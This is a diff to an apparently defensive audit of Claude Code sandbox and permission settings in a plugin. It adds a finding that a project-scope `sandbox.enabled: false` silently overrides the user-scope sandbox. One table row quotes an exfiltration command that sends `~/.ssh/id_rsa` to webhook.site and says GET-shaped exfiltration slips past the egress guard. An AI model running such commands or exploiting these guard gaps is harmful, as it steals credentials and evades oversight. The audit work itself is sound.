@@ -42,6 +42,7 @@ Only the groups below are worth recommending.
 | 2 | No `sandbox` block | OS-level Bash isolation plus the exfil-domain denylist | **PARTIAL.** `pretool/bash/network-egress-guard` returns `ask` on the *upload* shape, but a plain `curl -s https://pastebin.com/raw/…`, and even `curl -s https://webhook.site/x?d=$(cat ~/.ssh/id_rsa)`, ABSTAIN. Prompt is not block, and GET-shaped exfil walks straight through |
 | 3 | `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS` in no settings file | ork's own `src/hooks/src/lib/agent-teams.ts:28` gates `isAgentTeamsActive()` on `=== '1'`. Without it, team mode degrades silently: no error, no log line | N/A, a hook cannot set its own env |
 | 8 | `permissions.blockReadsOutsideWorkingDirectories: true` with no `~/.claude` in `additionalDirectories` (CC 2.1.257) | The key turns auto mode's one-time outside-read prompt into a refusal. analytics, dream, memory and doctor read `~/.claude` by design, and cross-repo work reads sibling checkouts; with the key set they fail silently instead of prompting once | N/A, a hook cannot widen the read boundary. `check-operator-permissions.cjs` reports it under `read_boundary` and prints the warning; never fails on it |
+| 9 | Project-scope `sandbox.enabled: false` while the user scope sets it true (#3877) | CC merges local > project > user, so the project file wins and every Bash call in that project runs with no sandbox: no egress denylist, no filesystem boundary. The user scope still reads as protected, so setup phase 3.6 and a user-scope-only read both look green. Measured 2026-09-02 in orchestkit: a gitignored `.claude/settings.local.json` carried the key and every denied host answered 200 | N/A, a hook cannot re-enable the sandbox. `check-operator-permissions.cjs` reports it under `sandbox_override` with the project `file:line` and the user `file:line`, names the effective source under `sandbox.source`, and prints the warning; never fails on it |
 
 Findings 4 and 5 are *offers*, not defects. `ENABLE_TOOL_SEARCH` and
 `CLAUDE_CODE_PLUGIN_KEEP_MARKETPLACE_ON_FAILURE` are real, useful, and entirely
@@ -201,6 +202,9 @@ tool names (`mcp__hq-channels__whatsapp_send_image`, `…_send_audio`, `…_send
 - **Check 15 and Check 16 overlap on purpose and can disagree by scope.** Check 15
   reads `settings.local.json` only; Check 16 reads all four. If they disagree, the
   block is set in a scope Check 15 does not look at.
+- **Finding 9 reads only the four scope files.** A project-scope `sandbox.enabled: false` with no user-scope
+  `true` is not an override (CC's default is off), so it is not reported; a managed-settings `true` is
+  invisible here for the same reason as everything else in this check.
 - **No runtime API.** Settings files are the only signal. A session sandboxed via a CLI
   flag with no settings key reads here as "absent".
 - **Hook-coverage claims in this file are dated.** They were measured against
